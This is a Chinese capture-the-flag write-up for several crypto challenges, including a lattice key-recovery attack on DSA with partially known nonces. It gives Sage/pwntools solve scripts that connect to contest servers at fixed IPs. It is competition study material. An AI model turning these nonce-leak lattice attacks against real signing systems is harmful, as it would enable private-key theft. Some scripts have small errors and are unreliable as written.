+$$ k = (hm \cdot s^{-1} - \text{msb} - \text{lsb}) \cdot 4^{-1} + x \cdot r \cdot (4s)^{-1} $$
+
+Exp
+
+```Python
+# -*- coding utf-8 -*-
+# @Time : 2024/5/25 15:11
+from hashlib import sha1
+from random import getrandbits
+
+from Crypto.Util.number import inverse
+from pwn import *
+def gen_ephemeral_key(k, lsb, msb):
+    return msb << (k + lsb.bit_length()) | getrandbits(k) << lsb.bit_length() | lsb
+
+def sign(pubkey, x, msg, lsb, msb):
+    p, q, g, y = pubkey
+    k = gen_ephemeral_key(150, lsb, msb)
+    r = pow(g, k, p) % q
+    Hm = int(sha1(msg).hexdigest(), 16)
+    s = (Hm + x * r) * inverse(k, q) % q
+    return (r, s)
+while 1:
+    sh = remote('121.37.182.7',10089)
+    line = sh.recvline().strip()[13:]
+    pub = eval(line)
+    p, q, g, y = pub
+    GG = GF(p)
+    Ms = [str(i).encode() for i in range(19)]
+    rr,ss = [],[]
+    for i in range(19):
+        sh.recvuntil(b'>')
+        sh.sendline(b'1')
+        sh.recvuntil(b'Which message to sign?: ')
+        sh.sendline(Ms[i])
+        r,s = eval(sh.recvline().strip()[11:])
+        rr.append(r)
+        ss.append(s)
+
+    for msb in range(192,256):
+        print(msb)
+        for lsb in range(2,4):
+            A = []
+            B = []
+            K = (msb<<152)+lsb
+            for i in range(19):
+                Hm = int(sha1(Ms[i]).hexdigest(), 16)
+                A.append(rr[i]*inverse(ss[i],q)*inverse(4,q) %q)
+                B.append((Hm*inverse(ss[i],q)- K)*inverse(4,q) %q)
+            M = Matrix(QQ,21)
+            for i in range(19):
+                M[i,i] = q
+                M[-2,i] = A[i]
+                M[-1,i] = B[i]
+            M[-2,-2] = 1/2^10
+            M[-1,-1] = 2^150
+            res = M.LLL()
+            x = abs(res[1][-2]*1024)
+            if y == ZZ(GG(g)^x):
+                r,s = sign(pub, x, b"get flag", lsb, msb)
+                sh.recvuntil(b'>')
+                sh.sendline(b'2')
+                sh.recvuntil(b"Which message to verify?: ")
+                sh.sendline(b"get flag")
+                sh.recvuntil(b"r:")
+                sh.sendline(str(r).encode())
+                sh.recvuntil(b"s:")
+                sh.sendline(str(s).encode())
+                print(sh.recv())
+            else:
+                continue
+    sh.close()
+```
+
+## Hello, XCTF!
+
+目标在b'XCTFxctf'组成一个64长度的字符串s，满足s+b'$'%p=b'hello'，p为自己设定的100位素数。
+
+$$\sum_{i=1}^{64}256^i*s_i=hello-\$\mod p$$
+
+目标字符串差距过大，考虑使用线性组合优化目标向量。参考NSSCTF-easy_mod
+
+发现仅有Xtf有良好的线性关系（-1，0，1）
+
+考虑爆破不同p来得到一组解
+
+```Python
+from Crypto.Util.number import *
+M = Matrix(ZZ,14)
+p = getPrime(100)
+c = 448378203211 #hello-$
+table = [ord(i) for i in "Xft"]
+
+#part1 linear transformation and remove prefix and suffix
+a = 1 * inverse(table[0]-table[1],p)
+b = (1 - a*table[0]) % p
+a,b
+for i in range(3):
+    print((a*table[i]+b)%p)
+c = c * inverse(256,p) % p
+c = a*c % p
+length = 64
+L = Matrix(ZZ,length+2,length+2)
+for i in range(length):
+    L[i,i] = 1
+    L[i,-1] = 256^i
+    c += 256^i*b
+    c %= p
+
+L[-2,-2] = 1
+L[-2,-1] = -c
+L[-1,-1] = p
+L[:,-1:] *= p
+res = L.BKZ(block_size=32)
+
+for i in res[:-1]:
+    flag = ""
+    for j in i[:-2][::-1]:
+        if(j == 1):
+            flag += "X"
+        elif(j == -1):
+            flag += "t"
+        elif(j == 0):
+            flag += "f"
+        elif(j==2):
+            flag += "J"
+    flag += "$"
+#     print(len(flag))
+    if(bytes_to_long(flag.encode()) % p == 448378203247):
+        print(flag)
+# p = 959011088180926180839552561337
+# flag = fXXftfffttftXfftfffXtftffXXXfffXttXXffftXftttXfXftfftXttffXffttt$
+```
+
+## D³
+
+简单说题目要求给出三个解密方式都能完成解密。
+
+第一种：标准解密，不用考虑。
+
+第二种：$$d=e^k\mod phi,phi=(p-1)*(q-1)$$
+
+第三种：$$d=e^k\mod phi,phi=lcm(p-1,q-1)$$
+
+k为指定的一个数，可在factordb分解成多个素数
+
+这里很显然后两种本质上是一样的，所以题目简化为：
+
+$$m^{e*d}=m\mod n\\m^{e^{k+1}\mod phi}=m\mod n$$
+
+能够满足条件的要求：$$k+1|\phi(phi)$$。k+1的素因子为17个，可以穷举一下组合得到满足条件的phi的素因子。
+
+```Python
+proof.all(False) # speed up primality checking a bit
+
+s=' 2 · 7 · 9 · 79 · 2731 · 4057 · 8191 · 121369 · 22366891 · 6740339310641 · 10030854869257 · 4929910764223610387 · 4966300248405749059 · 18526238646011086732742614043 · 3340762283952395329506327023033 · 167510000247425697384594847173622455701743569339841261429683667·8342680841093063014359532631803433656669591074421858694040109486076573471951766107416262860801'
+factors = [eval(i) for i in s.split('·')]
+import itertools
+from Crypto.Util.number import isPrime
+from hashlib import sha256
+C = []
+for ps in powerset(factors):
+    v = prod(ps) + 1
+    if is_prime(v):
+        C.append(prod(ps) + 1)
+print(C)
+```
+
+同理在通过phi的素因子做一个随机组合得到n
+
+```Python
+is_lucky_modulus = lambda p, q: p != q and is_lucky_prime(p) and is_lucky_prime(q)
+C = [19, 127, xxx]# 去除2，3.2是一定需要的，3是一定不需要的
+dit = {}
+print(len(C))
+for i in C:
+    if i.bit_length() in dit:
+        dit[i.bit_length()].append(i)
+    else:
+        dit[i.bit_length()] = [i]
+print(dit)
+while 1:
+    temp = random.choices(C,k=random.randint(2,5))
+    temp = reduce(lambda a, b: a * b, temp)
+    if temp.bit_length()>1024:continue
+    low,high = (2**1023//temp).bit_length(),(2**1024//temp).bit_length()
+    for i in range(low,high+1):
+        if i in dit:
+            for j in dit[i]:
+                temp1 = temp*j
+                if is_lucky_prime(2*temp1+1):
+                    print((2*temp1+1))
+# 126366417385482081632125709094422195763085260839280726740164612475634922264215045413877512640959314132187586716879561409141350180398416405619572141421522560637943964009554210789034269798922933667348876400327539861064015972617479878127021685556362985889939708226852813589758433391734452221720317317879861645259
+# 151974134283935133352420140651526474538548682010699934815033216140905302768143230133430556352882687267987873313578681017377217259032440048007955628689170671694683741633721001403202878128665495512534319682836729961494276461120603551226499672239779728136264935129191088698434836072763401447684000861562852767379
+# 106312089628793849062763337995024706937792152772069990672450023530583677738560813825597909857977982025524197288970637855162732583840554342767800584850797419457546950034663390577782967179012861468463694781815886302442867373996009972323299453999920718059621113399549466447947193549531131615015163546047741227827
+# 140646306779911236718100133345672526392582055647788058291509942224041198448052411163408694927566949009305647384291001717328802708260579523859117526078577710848945020201292305928651597199282635108376461842318627821309798059469913133091889616376641944238299416259355290939717393034960368973288667712851402681787
+```
+
+## Mersenne
+
+随机数生成器函数（random(n,w)）生成的随机数是n比特，汉明权重为w的数。这里w为12，n较大。所以整体随机数汉明权重很小。
+
+$$c=t*(a*h+b)\\h=g^{-1}*f\mod p$$
+
+f,g数较小，可以用$$M=\begin{pmatrix}h&1\\p&0\end{pmatrix}$$还原g,f。所以改写上述第一个等式$$g*c=t*(a*f+b*g)\mod p$$.
+
+t为-1，1的待求变量。g,f,a,b均为random生成的低汉明权重随机数。
+
+由于p是梅森素数。所以有$$2^k\mod p=2^{k-607};k>607$$。也就是经过mod运算不改变汉明权重。
+
+所以a*f，b*g不考虑进位的情况下最大均有12*12=144个1，做加法最大有288个1。在进位的情况下基本上是230左右的汉明权重。以此判断t。
+
+由于第一步还原g,f有小概率失败，所以先用*占位，所以多得到几次结果，取并集得到flag。
+
+```Python
+# -*- coding utf-8 -*-
+# @Time : 2024/5/26 15:37
+from Crypto.Util.number import long_to_bytes
+from pwn import *
+io = remote('123.60.161.30',10089)
+p = 2**607 - 1
+res = []
+flag = ''
+while 1:
+    try:
+        c,h = io.recvuntil(b'\n',drop=True).decode().split(' ')
+        c,h = eval(c),eval(h)
+        M = Matrix(ZZ,[[h,1],[p,0]])
+        R = M.LLL()
+        f,g = abs(R[0][0]),abs(R[0][1])
+        if sum([int(i) for i in bin(f)[2:]]) == 12:
+            if sum([int(i) for i in bin((g*c)%p)[2:]])<260:
+                flag += '0'
+            else:
+                flag += '1'
+        else:
+            flag += '*'
+    except:
+        io.close()
+        # print(long_to_bytes(int(flag,2)))
+        print(flag)
+        break
+```
+
+```Python
+flag1 = '010100100100001101010100010001100111101100110010011000110011001001100010011001000011011100110111001*0111001011010011011100110001001100000110011000101101001101000*100010001101000011001100101101011000100011001101100100011000110010110100110000001100000110000101100100011000100110001101100011011001000011100100110011001101110011011101111101'
+flag2 = '01010010010000110101010*0100011*0111101100110010011000110011001001100010011001000011011100*1011100110111001011010*1*01*1001100010011000001100110001011010011010001100010001*01000011001100101*0101100010001100110110*10001*00011001*110*00110000001100000110000101*00*000110001001100011011*0011011001000011100100110011001101110011011101111101'
+
+
+flag = ''
+for i,j in zip(flag2,flag1):
+    if i!='*':
+        flag += i
+    else:
+        flag+=j
+print(flag)
+print(long_to_bytes(int(flag,2)))
+```
+
+## L³
+
+简单分析题目：
+
+$$ g_i^{\text{otp}} \cdot \text{leak} \equiv g^{sk_1 \cdot es_1 + sk_2 \cdot es_2 + sk_3 \cdot es_3} \pmod{p} $$
+
+$$g_i$$为round_g,g为原始的生成元.$$es_i$$较小。
+
+素数p光滑，dlp问题可解。随机生成一个基元作为新的生成元G
+
+$$G^{s_i*otp+e_i}=G^{sk_1^,*es_1+sk_2^,*es_2+sk_3^,*es_3}$$
+
+$$s_i*otp+e_i=sk_1^,*es_1+sk_2^,*es_2+sk_3^,*es_3$$
+
+这个等式只有$$s_i,e_i$$已知。考虑正交格，得到向量u。满足$$=0,=0$$；
+
+同时使得$$=0,=0,=0$$。
+
+即先通过正交格得到u，然后取u的右核矩阵v，在规约一下得到短向量es。
+
+由于es1较大520bit,es2,es3均为512bit。
+
+通过测试矩阵运算v.T*x=es，得到$$\begin{pmatrix}i&0&1\\j&-1&-1\\1&0&0\end{pmatrix}$$，即es2,es3可以直接由v的简单线性组合得到，es1则需要爆破i,j。结果测试两组数据发现i,j均为(-256,256)的范围，可以爆破。
+
+还原otp：
+
+暂令es1=v2,es2,es3已知。求解es1,es2,es3三个向量的正交格u1。
+
+得到$$*otp+=0\mod (p-1)$$,得到otp。
+
+通过前缀RCTF爆破i,j判断es1向量第32个字节是否与目标相等，来确定i,j。
+
+Exp
+
+```Python
+p = 0x1795712A13E07F7CCA7A0B09B33EE746414E48863BD7EE1BD0D883460828FE88516774E44AC3F0CE5DA045688C40844677DA6D38582AC7CF2C00E8724AD399059E9298BB1AD9834DAA0481765FFBB00FCA71BAD1E024F7193334D71755B0EEA1D1C761E11FB67C3B495F8D12720A59A8AAEC3F8A59BD6BC45C8C236A29B74CBE823BF9A816556F6DD79364A3E87B02028F9B35C5BC46EE597ABDC1A465B9F41353DD514AA5B91326EB4868BA1C3BC8B74F55DBEF6E59BCF896E15C8400CA6B695C368EF87CBD99FDD4D33F5889EE36A571240B16FFD76C0FAEB81E4550B8549193E88CF630D2422903D1AA08CA369FE0E79DD04F581B7DD8CB1D3F28F9EE2583B
+G = GF(p)
+from secrets import randbelow, token_bytes
+Ls = 
+gs = 
+g = 45271426195437984198148734130819758602633909815689072697478701620601435374673859115374977739381723399290678384412185045217122060295726959080235531506689431253052329409248991162086755435524236239059164372248760776929823125679997728474984060374726551469255675878559640618558013763390399453799698222302893713694848361621145466743475696742422956752275573833137869181667151612124053978279138459573664900264490229603163834249353694326197102808037601830972670908019774394079149810806591598567334118064953523756408265128194654597075018359473812617392872386329084774129433549345609748777264532420011155288544759753547510177100
+afs = [discrete_log(G(gi),G(g)) for gi in gs]
+hs = [discrete_log(G(li),G(g)) for li in Ls]
+M = Matrix(ZZ,74)
+for i in range(72):
+    M[i,-1] = afs[i]
+    M[i,-2] = hs[i]
+    M[i,i] = 1
+    M[-1,-1] = p-1
+    M[-2,-2] = p-1
+M.rescale_col(72,2^1000)
+M.rescale_col(73,2^1000)
+res = M.LLL()
+ortm = res[:-2,:-2]
+ortm = ortm[:-3]
+# 测试发现后三组不满足与es正交所以去除
+es = ortm.right_kernel_matrix().BKZ()
+v1 = -es[1]
+v2 = es[0] - es[1]
+v0 = es[2]
+M = Matrix(ZZ,75)
+for i in range(72):
+    M[i,-1] = v0[i]
+    M[i,-2] = v1[i]
+    M[i,-3] = v2[i]
+    M[i,i] = 1
+M[-1,-1] = p-1
+M[-2,-2] = p-1
+M[-3,-3] = p-1
+M.rescale_col(72,2^1000)
+M.rescale_col(73,2^1000)
+M.rescale_col(74,2^1000)
+res = M.LLL()
+(sum([i*j for i,j in zip(afs,res[2])])*otp+sum([i*j for i,j in zip(hs,res[2])]))%(p-1)
+otp = (-sum([i*j for i,j in zip(hs,res[2])]))*inverse_mod(sum([i*j for i,j in zip(afs,res[2])]),p-1)%(p-1)
+# otp = 128014576779010347641276589457573367112401478547684141654683946467594935856339983682465033576749697579626748196826109013977343102747578712429921277421560812163785175294082899
+otp = long_to_bytes(otp)
+v1 = -es[1]
+v2 = es[0] - es[1]
+v0 = es[2]
+v0[0],v1[0],v2[0]
+for i in range(-256,256):
+    for j in range(-256,256):
+        ee1 = v0 + i*v1 + j*v2
+        try:
+            if chr(long_to_bytes(abs(ee1[0]))[32]^^otp[i]) == b'R':
+                if chr(long_to_bytes(abs(ee1[1]))[32]^^otp[i]) == b'C':
+                    if chr(long_to_bytes(abs(ee1[1]))[32]^^otp[i]) == b'T':
+                        print(i,j)
+                        # -127 , -101
+        except:
+            continue
+```
+
+```Python
+ee1 = v0 + -127*v1 + -101 * v2
+ee1 = -ee1
+for i in range(72):
+    print(chr(long_to_bytes(ee1[i])[32]^^otp[i]),end='')
+# RCTF{___good_basis___bad_basis___How_about_my_1_byte_imbalance_basis___}
+```
+
